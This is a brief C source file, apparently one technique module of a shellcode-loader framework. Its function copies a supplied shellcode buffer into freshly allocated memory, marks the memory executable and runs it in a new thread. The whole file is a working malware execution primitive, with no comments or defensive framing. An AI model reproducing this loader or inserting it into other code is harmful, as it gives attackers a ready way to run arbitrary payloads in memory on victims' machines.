#include "../dispatch.h"

BOOL tech_createthread(unsigned char *sc, size_t len) {
    LPVOID mem = VirtualAlloc(NULL, len, MEM_COMMIT | MEM_RESERVE,
                              PAGE_READWRITE);
    if (!mem) return FALSE;

    memcpy(mem, sc, len);

    DWORD old;
    VirtualProtect(mem, len, PAGE_EXECUTE_READ, &old);

    HANDLE hThread = CreateThread(NULL, 0,
                                  (LPTHREAD_START_ROUTINE)mem,
                                  NULL, 0, NULL);
    if (!hThread) return FALSE;
    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);
    return TRUE;
}
